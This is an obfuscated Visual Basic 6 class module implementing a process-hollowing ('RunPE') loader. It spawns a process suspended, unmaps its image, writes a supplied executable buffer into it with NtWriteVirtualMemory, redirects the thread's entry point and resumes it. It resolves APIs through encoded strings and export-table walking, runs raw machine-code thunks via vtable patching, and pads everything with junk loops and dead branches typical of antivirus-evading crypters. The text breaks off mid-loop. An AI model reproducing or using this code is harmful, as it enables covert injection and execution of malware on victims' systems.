VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "PE"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)



Private Const IMAGE_DOS_SIGNATURE       As Long = &H5A4D&
Private Const IMAGE_NT_SIGNATURE        As Long = &H4550&

Private Const SIZE_DOS_HEADER           As Long = &H40
Private Const SIZE_NT_HEADERS           As Long = &HF8
Private Const SIZE_EXPORT_DIRECTORY     As Long = &H28
Private Const SIZE_IMAGE_SECTION_HEADER As Long = &H28

Private Const THUNK_APICALL             As String = "8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3"
Private Const THUNK_KERNELBASE          As String = "8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3"

Private Const PATCH1                    As String = "<PATCH1>"
Private Const PATCH2                    As String = "<PATCH2>"

Private Const CONTEXT_FULL              As Long = &H10007
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40


Private Type STARTUPINFO
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess                    As Long
    hThread                     As Long
    dwProcessId                 As Long
    dwThreadId                  As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type CONTEXT
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As FLOATING_SAVE_AREA
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature                   As Long
    FileHeader                  As IMAGE_FILE_HEADER
    OptionalHeader              As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_EXPORT_DIRECTORY
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
       
Public Function GWxLtUOHDE7m6ht() As Long
    'This function will be replaced with machine code laterz
If "jnlAbpTmSx1Bt1" = "utIQ8K5sul" Then End
    'Do not add any public procedure on top of it
GoTo KWUtLDMhoSTJZxVOowtSs0mp
KWUtLDMhoSTJZxVOowtSs0mp:
End Function

Public Function ojrPyaCm1NU9O6c(ByRef bvBuff() As Byte, Optional sHost As String, Optional ByRef hProc As Long) As Boolean
    Dim dJuNTtjsKD                       As Long
GoTo YZ1Z4lEf3k2lidWf1
YZ1Z4lEf3k2lidWf1:
    Dim dQt7Mt0re2       As IMAGE_DOS_HEADER
    Dim l4nIAkdEHp       As IMAGE_NT_HEADERS
    Dim Td8W2FIJnO   As IMAGE_SECTION_HEADER
    Dim JuPsqRJ13b            As STARTUPINFO
Dim SzmgGaTUfeHKaoFIZ7gT As Integer
SzmgGaTUfeHKaoFIZ7gT = "3150"
    Dim aHlBsx2bVy    As PROCESS_INFORMATION
    Dim y1O1p4RAOV                As CONTEXT
    Dim xh6505YQSi                 As Long
    Dim DFkqxXBjXE                  As Long
Dim HUWomHl9tqjaX As Long
HUWomHl9tqjaX = "6567"
    Dim lYooHkwFe1                    As Long
Dim mL2d9EdyLbMDzU As Long
mL2d9EdyLbMDzU = "4293"
   
Dim CFcfqpyJvHecREyZs As Integer
CFcfqpyJvHecREyZs = 10
Do While CFcfqpyJvHecREyZs < 20
   DoEvents: CFcfqpyJvHecREyZs = CFcfqpyJvHecREyZs + 1
Loop
    If Not c_bInit Then Exit Function

Dim EweOai3fq4esUAbq As Currency
EweOai3fq4esUAbq = "7583"
    Call CopyBytes(SIZE_DOS_HEADER, dQt7Mt0re2, bvBuff(0))
   
If "kLzEzgYQSO9cx1" = "rvKdmOtjAQ" Then End
    If Not dQt7Mt0re2.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
If "FDnBlKP6tKWIWCM7lSUl4C" = "INgFgutsWD" Then End
    End If
GoTo qqkAn01wOcdNEXrSi
qqkAn01wOcdNEXrSi:

    Call CopyBytes(SIZE_NT_HEADERS, l4nIAkdEHp, bvBuff(dQt7Mt0re2.e_lfanew))
   
    If Not l4nIAkdEHp.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
GoTo xWDA75miCTjyNMB4gwc4f0M
xWDA75miCTjyNMB4gwc4f0M:
    End If
GoTo pKcDQOxdzw9uFJcyawj3nW
pKcDQOxdzw9uFJcyawj3nW:
   
                                    'kernel32
GoTo Lj7BVkU4frGE5
Lj7BVkU4frGE5:
    xh6505YQSi = PAg7OcawAhTBPf6(xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("6F2E5A5B5C78453551030F266A5F5F5C"), "YllnkJspg69e")))                                                                                              'KPC
GoTo IB3sryU3oHH80yh
IB3sryU3oHH80yh:
                                    'ntdll
GoTo XFEtyOYq6eNRjg0GP1W
XFEtyOYq6eNRjg0GP1W:
    DFkqxXBjXE = PAg7OcawAhTBPf6(xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("620D786D55647F04002D"), "THOYcPIG6nAT")))                                                                                                  'KPC
Dim p0iRhoOzGOTuF As Integer
p0iRhoOzGOTuF = 14
Do While p0iRhoOzGOTuF < 27
   DoEvents: p0iRhoOzGOTuF = p0iRhoOzGOTuF + 1
Loop
   
    If sHost = vbNullString Then
        sHost = Space(260)
Dim Dmjivf7DqZD9VARCipN As Integer
For Dmjivf7DqZD9VARCipN = 1 To 5
   DoEvents
Next Dmjivf7DqZD9VARCipN
                                                'GetModuleFileNameW
If "upu04bkbCx" = "bMu7rDsQAq" Then End
        lYooHkwFe1 = dLjBHpnD9DdSol7(xh6505YQSi, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("4776067C795806156E3F72704474060A785906676E4072074574040C785D04156E4C7173"), "sA0INl2QXyDD")))                                                                       'KPC
Dim LJFOdoVCkK3Q4t76bMzP As String
LJFOdoVCkK3Q4t76bMzP = "1954"
        qEll7BcX06s3gO2 lYooHkwFe1, App.hInstance, StrPtr(sHost), 260
    End If
   
GoTo SPqAGofQ37MofdHg3T
SPqAGofQ37MofdHg3T:
    With l4nIAkdEHp.OptionalHeader
Dim jQIp7CmSQjXd As Integer
For jQIp7CmSQjXd = 2 To 5
   DoEvents
Next jQIp7CmSQjXd
       
GoTo BLm0YLVLsd3dUDJ
BLm0YLVLsd3dUDJ:
        JuPsqRJ13b.cb = Len(JuPsqRJ13b)
Dim OXVrl8vCfnaHbpPDLGe As Integer
OXVrl8vCfnaHbpPDLGe = 12
Do While OXVrl8vCfnaHbpPDLGe < 22
   DoEvents: OXVrl8vCfnaHbpPDLGe = OXVrl8vCfnaHbpPDLGe + 1
Loop
           
Dim deKfziwfIDrYsSp8YEp As Integer
deKfziwfIDrYsSp8YEp = "381"
                                                'CreateProcessW
Dim vPuQJsCKpwfBOAxw0qZx As Integer
vPuQJsCKpwfBOAxw0qZx = 5
Do While vPuQJsCKpwfBOAxw0qZx < 31
   DoEvents: vPuQJsCKpwfBOAxw0qZx = vPuQJsCKpwfBOAxw0qZx + 1
Loop
        lYooHkwFe1 = dLjBHpnD9DdSol7(xh6505YQSi, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("727858745800027A0766075D737B5874587302780667065B71785A71"), "FKoFn54K0R1h")))                                                                           'KPC
        qEll7BcX06s3gO2 lYooHkwFe1, 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(JuPsqRJ13b), VarPtr(aHlBsx2bVy)

GoTo M0eE1atYaI4C8kQ
M0eE1atYaI4C8kQ:
                                                'NtUnmapViewOfSection
GoTo IB2venWle0ns3pOlTu
IB2venWle0ns3pOlTu:
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("4C35417F7250573C0571046B4F40437D715C574C0402061C4E4643787150574A040104634E36400E"), "xpvKGeay352Z")))                                                                      'KPC
Dim FgSayB6bQ31GET As String
FgSayB6bQ31GET = "3484"
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hProcess, .ImageBase
GoTo moyMnuuD8uRBhbHCP2QhKL
moyMnuuD8uRBhbHCP2QhKL:
       
GoTo uBtie8xq4fD7r6llXebnnE
uBtie8xq4fD7r6llXebnnE:
                                                'VirtualAllocEx
If "NxAtGEm1zw" = "FFkqoqs8dh" Then End
        lYooHkwFe1 = dLjBHpnD9DdSol7(xh6505YQSi, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("467B6F554D5E467B62584274450E6D5D4C2F470C632B427647786E54"), "sMYlzlqOUmtE")))                                                                           'KPC
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
       
Dim olfzHswid9W As Integer
For olfzHswid9W = 0 To 7
   DoEvents
Next olfzHswid9W
                                                'NtWriteVirtualMemory
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("70236D79740F5E540F7A455872536F7B77015E540E77455972576C0E757C5F530F07442A73546D74"), "DfZMA8if9Crl")))                                                                      'KPC
Dim h9ODqbHdaMM As Integer
For h9ODqbHdaMM = 1 To 11
   DoEvents
Next h9ODqbHdaMM
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
Dim TCTCMspfAeMlUCJg1Tni As Integer
TCTCMspfAeMlUCJg1Tni = "2972"
   
        For dJuNTtjsKD = 0 To l4nIAkdEHp.FileHeader.NumberOfSections - 1
            CopyBytes Len(Td8W2FIJnO), Td8W2FIJnO, bvBuff(dQt7Mt0re2.e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * dJuNTtjsKD)
            qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hProcess, .ImageBase + Td8W2FIJnO.VirtualAddress, VarPtr(bvBuff(Td8W2FIJnO.PointerToRawData)), Td8W2FIJnO.SizeOfRawData, 0
GoTo YIbPE5uLqeSs2u4fRO
YIbPE5uLqeSs2u4fRO:
        Next dJuNTtjsKD

Dim q3PdnFkU1OX6o As Integer
q3PdnFkU1OX6o = 13
Do While q3PdnFkU1OX6o < 34
   DoEvents: q3PdnFkU1OX6o = q3PdnFkU1OX6o + 1
Loop
        y1O1p4RAOV.ContextFlags = CONTEXT_FULL
       
Dim J5AEb6IWwG As String
J5AEb6IWwG = "8700"
                                                'NtGetContextThread
If "iM7Y1r6m7EjyhcRxBBOtH" = "Z8PUF5KeJ2" Then End
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("52154E067F757B667866620150164F777C767B66786A610653644F0A7C707B6679636006"), "fPy2KBMSORV2")))                                                                        'KPC
Dim cwTfuL4ehy As String
cwTfuL4ehy = "7307"
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hThread, VarPtr(y1O1p4RAOV)
If "mUJkNh7V3GF" = "LvwKpQ2T8v" Then End
   
Dim cGlflgOqezg As Integer
For cGlflgOqezg = 2 To 3
   DoEvents
Next cGlflgOqezg
                                                'NtWriteVirtualMemory
If "u7EQEVaIZrrL" = "iZiV5ohyBQ" Then End
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("6C307203067C6475670D617F6E407001057264756600617E6E447374070F65726770600D6F47720E"), "XuE73KSGQ4VK")))                                                                      'KPC
GoTo tBYQcpojRsljuV
tBYQcpojRsljuV:
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hProcess, y1O1p4RAOV.Ebx + 8, VarPtr(.ImageBase), 4, 0
Dim qJsHR8E53IJBq7i As Integer
For qJsHR8E53IJBq7i = 4 To 8
   DoEvents
Next qJsHR8E53IJBq7i
       
GoTo Qx7RFLQExEZ4YCA4Rvql
Qx7RFLQExEZ4YCA4Rvql:
        y1O1p4RAOV.Eax = .ImageBase + .AddressOfEntryPoint
GoTo HTbzWGxCDdeWM
HTbzWGxCDdeWM:
       
                                                'NtSetContextThread
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("66170F7D63610E627F58594364140E0C61660E627F545A4467660E7161600E627E5D5B44"), "RR8IVR8WHlmp")))                                                                        'KPC
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hThread, VarPtr(y1O1p4RAOV)
       
GoTo iijsGqGlcxsTjhkdErrhv4
iijsGqGlcxsTjhkdErrhv4:
                                                'NtResumeThread
If "XxenLSBrgrXu6lhAMzYEqpsu" = "Ggh5vsUSnl" Then End
        lYooHkwFe1 = dLjBHpnD9DdSol7(DFkqxXBjXE, xnliOl1RCE6MExN(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("572E0E0D6276065A6F715C03552F0F0C627006576F705D03555A0F0D"), "ck99WD0oXBk6")))                                                                            'KPC
If "Em1ZTMwvDRv2JIJ" = "QSCgfgcBez" Then End
        qEll7BcX06s3gO2 lYooHkwFe1, aHlBsx2bVy.hThread, 0
       
        hProc = aHlBsx2bVy.hProcess
GoTo nroo2DWC0Xq2
nroo2DWC0Xq2:
    End With
   
Dim CfTcIkKEBc As Integer
CfTcIkKEBc = "5345"
    ojrPyaCm1NU9O6c = True
Dim jTLfomFN7e5HjcK As Integer
For jTLfomFN7e5HjcK = 0 To 4
   DoEvents
Next jTLfomFN7e5HjcK
End Function

Public Function qEll7BcX06s3gO2(ByVal lYooHkwFe1 As Long, ParamArray Params()) As Long
    Dim LZeleOvvUq        As Long
    Dim dJuNTtjsKD           As Long
Dim d3yjJ7TVePn As Integer
d3yjJ7TVePn = 9
Do While d3yjJ7TVePn < 34
   DoEvents: d3yjJ7TVePn = d3yjJ7TVePn + 1
Loop
    Dim kqF54l1Tgb       As String
    Dim hPhSnoypVx     As String
GoTo iTfLtGvozF0M3zrnPNk9k
iTfLtGvozF0M3zrnPNk9k:
   
If "BvZmDQBThyOppgyLRzUe81" = "LHRMaelh6r" Then End
    If lYooHkwFe1 = 0 Then Exit Function
GoTo eooo6OrDtEcNYt3weD1
eooo6OrDtEcNYt3weD1:
   
    For dJuNTtjsKD = UBound(Params) To 0 Step -1
        hPhSnoypVx = hPhSnoypVx & wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("736C"), "ETIp66u1BQON") & zurw5U60xbNL866(CLng(Params(dJuNTtjsKD)))
Dim I5zEsSl8V2pDyVFgGOp As Integer
For I5zEsSl8V2pDyVFgGOp = 2 To 10
   DoEvents
Next I5zEsSl8V2pDyVFgGOp
    Next
Dim Ldb1dImHQ4 As Integer
Ldb1dImHQ4 = 4
Do While Ldb1dImHQ4 < 29
   DoEvents: Ldb1dImHQ4 = Ldb1dImHQ4 + 1
Loop
   
If "M9peXj9D3mdZC3" = "mpJM2JfalE" Then End
    LZeleOvvUq = VarPtr(c_bvASM(0))
    LZeleOvvUq = LZeleOvvUq + (UBound(Params) + 2) * 5
    LZeleOvvUq = lYooHkwFe1 - LZeleOvvUq - 5
Dim ojUuRQgJnLknbnHUR As Integer
For ojUuRQgJnLknbnHUR = 0 To 3
   DoEvents
Next ojUuRQgJnLknbnHUR
   
    kqF54l1Tgb = THUNK_APICALL
    kqF54l1Tgb = Replace(kqF54l1Tgb, PATCH1, hPhSnoypVx)
    kqF54l1Tgb = Replace(kqF54l1Tgb, PATCH2, zurw5U60xbNL866(LZeleOvvUq))
   
If "Jm9rtPRbVI" = "TOM465Rv6q" Then End
    Call PutThunk(kqF54l1Tgb)
   
Dim wmTu3soUjqwAmj1Pz5Ny As String
wmTu3soUjqwAmj1Pz5Ny = "2374"
    qEll7BcX06s3gO2 = RputjbmEJeqZi7p
End Function

Private Function zurw5U60xbNL866(ByVal lData As Long) As String
    Dim ZXEE3y9r0W(3)   As Byte
    Dim dJuNTtjsKD           As Long
Dim juGBYrx9kEiU7lou4 As Integer
For juGBYrx9kEiU7lou4 = 1 To 4
   DoEvents
Next juGBYrx9kEiU7lou4
   
GoTo XyHWC1tlyaxTSyuUqik
XyHWC1tlyaxTSyuUqik:
    CopyBytes &H4, ZXEE3y9r0W(0), lData
Dim lbhbRQisi1EZ9ip As Integer
For lbhbRQisi1EZ9ip = 3 To 8
   DoEvents
Next lbhbRQisi1EZ9ip
    For dJuNTtjsKD = 0 To 3
        zurw5U60xbNL866 = zurw5U60xbNL866 & Right(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("47"), "wzOupgAPE3Pv") & Hex(ZXEE3y9r0W(dJuNTtjsKD)), 2)
Dim UhEA0HIzF7zZ As Long
UhEA0HIzF7zZ = "731"
    Next
Dim u96tiU5U6sHuk74DmX0LoKet As Integer
For u96tiU5U6sHuk74DmX0LoKet = 2 To 8
   DoEvents
Next u96tiU5U6sHuk74DmX0LoKet
End Function

Private Sub PutThunk(ByVal sThunk As String)
    Dim dJuNTtjsKD   As Long
If "desTrLv1tzBuZuJIOPx02" = "ZaIm0Z9y9H" Then End
    For dJuNTtjsKD = 0 To Len(sThunk) - 1 Step 2
Dim WYfaU5uTDtU As Integer
WYfaU5uTDtU = "985"
        c_bvASM((dJuNTtjsKD / 2)) = CByte(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("543F"), "rWi5hmQ5vkgb") & Mid$(sThunk, dJuNTtjsKD + 1, 2))
    Next dJuNTtjsKD
End Sub

Private Function RputjbmEJeqZi7p() As Long
    CopyBytes &H4, c_lVTE, ByVal ObjPtr(Me)
    c_lVTE = c_lVTE + &H1C
    CopyBytes &H4, c_lOldVTE, ByVal c_lVTE
    CopyBytes &H4, ByVal c_lVTE, VarPtr(c_bvASM(0))
    RputjbmEJeqZi7p = GWxLtUOHDE7m6ht
GoTo np3fpdDLkh8pemS
np3fpdDLkh8pemS:
    CopyBytes &H4, ByVal c_lVTE, c_lOldVTE
End Function

Public Function PYyR2HMeYQD2Hvq(ByVal sLib As String, ByVal sProc As String) As Long
    PYyR2HMeYQD2Hvq = Me.dLjBHpnD9DdSol7(Me.PAg7OcawAhTBPf6(sLib), sProc)
Dim ydU7zaVI45aaq5bpbFdbpBP As Integer
For ydU7zaVI45aaq5bpbFdbpBP = 3 To 11
   DoEvents
Next ydU7zaVI45aaq5bpbFdbpBP
End Function

Public Function PAg7OcawAhTBPf6(ByVal sLib As String) As Long
    PAg7OcawAhTBPf6 = qEll7BcX06s3gO2(c_lLoadLib, StrPtr(sLib & vbNullChar))
End Function

Public Property Get Initialized() As Boolean
    Initialized = c_bInit
End Property

Public Sub Class_Initialize()

    Call PutThunk(THUNK_KERNELBASE)
   
Dim y3t7JFcv65xZr8zEquMkDf As Currency
y3t7JFcv65xZr8zEquMkDf = "7765"
    c_lKrnl = RputjbmEJeqZi7p
   
Dim f2HJH4QMrwJI4s As Integer
f2HJH4QMrwJI4s = 3
Do While f2HJH4QMrwJI4s < 34
   DoEvents: f2HJH4QMrwJI4s = f2HJH4QMrwJI4s + 1
Loop
    If Not c_lKrnl = 0 Then
        c_lLoadLib = dLjBHpnD9DdSol7(c_lKrnl, wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("0F1F0B1325502B052A331D05"), "Cpjwi9IwKAdR"))
        If Not c_lLoadLib = 0 Then
            c_bInit = True
        End If
    End If
GoTo Et8Q6QXQVbRAyWPbsn
Et8Q6QXQVbRAyWPbsn:
End Sub

Public Function dLjBHpnD9DdSol7(ByVal lYooHkwFe1 As Long, ByVal sProc As String) As Long
    Dim dQt7Mt0re2       As IMAGE_DOS_HEADER
    Dim l4nIAkdEHp       As IMAGE_NT_HEADERS
    Dim itZvTnKbnL As IMAGE_EXPORT_DIRECTORY
   
GoTo ufKKEOEl63sDm7XhiZ
ufKKEOEl63sDm7XhiZ:
    Call CopyBytes(SIZE_DOS_HEADER, dQt7Mt0re2, ByVal lYooHkwFe1)
   
    If Not dQt7Mt0re2.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
Dim k1lFcNmQiV3Gaj5m9A As Integer
k1lFcNmQiV3Gaj5m9A = "801"
    End If
If "Mw7Qjr51QQ3MJS969MeKQ9" = "yHQIR3PYMy" Then End

Dim m8twa5a0aTsh As Long
m8twa5a0aTsh = "9101"
    Call CopyBytes(SIZE_NT_HEADERS, l4nIAkdEHp, ByVal lYooHkwFe1 + dQt7Mt0re2.e_lfanew)
   
Dim Kzq3Zt3mLbYHHNaai As Integer
Kzq3Zt3mLbYHHNaai = 9
Do While Kzq3Zt3mLbYHHNaai < 37
   DoEvents: Kzq3Zt3mLbYHHNaai = Kzq3Zt3mLbYHHNaai + 1
Loop
    If Not l4nIAkdEHp.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
Dim O73cCLjbEUj2MG As String
O73cCLjbEUj2MG = "3406"
   
If "CC5k9MvDP7yEySJUxVMlKYX" = "A6giN0Ut9p" Then End
    Dim YKG1hyLt38   As Long
Dim iGvA6SrkrsdLatVBWqpr As Currency
iGvA6SrkrsdLatVBWqpr = "4046"
    Dim pXcajf4EVw      As Long
Dim KpZ38ZjaObkwHQzp As Currency
KpZ38ZjaObkwHQzp = "4795"
    Dim NhFBgMT2NS       As Long
If "iqomGjaYkatLam" = "ina32RYanZ" Then End
   
Dim JuFhB1RAkgdt0s3PwndYwmC As Integer
JuFhB1RAkgdt0s3PwndYwmC = "2683"
    With l4nIAkdEHp.OptionalHeader
If "GcCVZG6PrcezXzCb8" = "IZ6AzwoiTj" Then End
        YKG1hyLt38 = lYooHkwFe1 + .DataDirectory(0).VirtualAddress
If "lCGYUbJYLhI" = "taZ0sNaEoM" Then End
        pXcajf4EVw = YKG1hyLt38 + .DataDirectory(0).Size
Dim r80USq1rJF8QE As Integer
For r80USq1rJF8QE = 0 To 1
   DoEvents
Next r80USq1rJF8QE
        NhFBgMT2NS = .ImageBase
If "eM0sFzInZvobp8cT3Zmryq" = "zUvJtGBm1U" Then End
    End With
Dim TI3n32958nCpchWKFL08V4h As Long
TI3n32958nCpchWKFL08V4h = "2302"
   
    Call CopyBytes(SIZE_EXPORT_DIRECTORY, itZvTnKbnL, ByVal YKG1hyLt38)
       
Dim hoqoygbgGWgStP6 As Currency
hoqoygbgGWgStP6 = "913"
    Dim dJuNTtjsKD           As Long
    Dim Fv1GOWb3mG   As Long
    Dim mO5EZi6oD2    As Long
Dim qsTUzpvQEGpcEN As Integer
qsTUzpvQEGpcEN = 4
Do While qsTUzpvQEGpcEN < 35
   DoEvents: qsTUzpvQEGpcEN = qsTUzpvQEGpcEN + 1
Loop
    Dim bf5U5wxYTo    As Long

GoTo u0v6ZwOXnIqRLxi
u0v6ZwOXnIqRLxi:
    With itZvTnKbnL
        For dJuNTtjsKD = 0 To .NumberOfNames - 1
Dim Flzp2CEBm8VDXvwTdT5iU As Long
Flzp2CEBm8VDXvwTdT5iU = "8451"
           
Dim cPiJ7qJ1K8YqpUK6y4BKf As Integer
cPiJ7qJ1K8YqpUK6y4BKf = 9
Do While cPiJ7qJ1K8YqpUK6y4BKf < 22
   DoEvents: cPiJ7qJ1K8YqpUK6y4BKf = cPiJ7qJ1K8YqpUK6y4BKf + 1
Loop
            CopyBytes 4, mO5EZi6oD2, ByVal NhFBgMT2NS + .lpAddressOfNames + dJuNTtjsKD * 4
Dim xOLTt06qvnRLOEFEzlR As String
xOLTt06qvnRLOEFEzlR = "479"
           
If "PpwuD9cUdfGp9mN2B7rC" = "qyjLaSmK23" Then End
            If AvOiPNOUo58yRKh(NhFBgMT2NS + mO5EZi6oD2) = sProc Then
If "HSIZ4wFImuDx0vVOYyd" = "roZ0sRWtr4" Then End
                CopyBytes 2, bf5U5wxYTo, ByVal NhFBgMT2NS + .lpAddressOfNameOrdinals + dJuNTtjsKD * 2
GoTo muIBrThMwWm0C
muIBrThMwWm0C:
                CopyBytes 4, Fv1GOWb3mG, ByVal NhFBgMT2NS + .lpAddressOfFunctions + bf5U5wxYTo * 4
               
GoTo W6K02hti11nsiag20P7euCq
W6K02hti11nsiag20P7euCq:
                dLjBHpnD9DdSol7 = Fv1GOWb3mG + NhFBgMT2NS
Dim ItaPziHt7tWF3hS As Integer
ItaPziHt7tWF3hS = "2191"
                             
                If dLjBHpnD9DdSol7 >= YKG1hyLt38 And _
                   dLjBHpnD9DdSol7 <= pXcajf4EVw Then
                    Call OzUinbxffxHkyjH(dLjBHpnD9DdSol7, lYooHkwFe1, sProc)
                    If Not lYooHkwFe1 = 0 Then
GoTo mak8HbDgp9OQFA2O04o
mak8HbDgp9OQFA2O04o:
                        dLjBHpnD9DdSol7 = dLjBHpnD9DdSol7(lYooHkwFe1, sProc)
Dim ZUYU4pRlPh90q0GvOhG As Long
ZUYU4pRlPh90q0GvOhG = "9610"
                    Else
                        dLjBHpnD9DdSol7 = 0
GoTo lPYzqPV9BLU1EMA6t
lPYzqPV9BLU1EMA6t:
                    End If
If "sP54wVGWkySrMvhCoBB6M" = "xgmyoMoSp5" Then End
                End If
               
If "pHtIK5FnpvwJJArJ" = "y03vNLhCkI" Then End
                Exit Function
            End If
GoTo Nys2rVMZYt2Nc
Nys2rVMZYt2Nc:
        Next
If "Fb6wJNZ04IC6" = "d1HdVaOrID" Then End
    End With
   
Dim K1iso1LSX7jT98OZ As Integer
For K1iso1LSX7jT98OZ = 4 To 13
   DoEvents
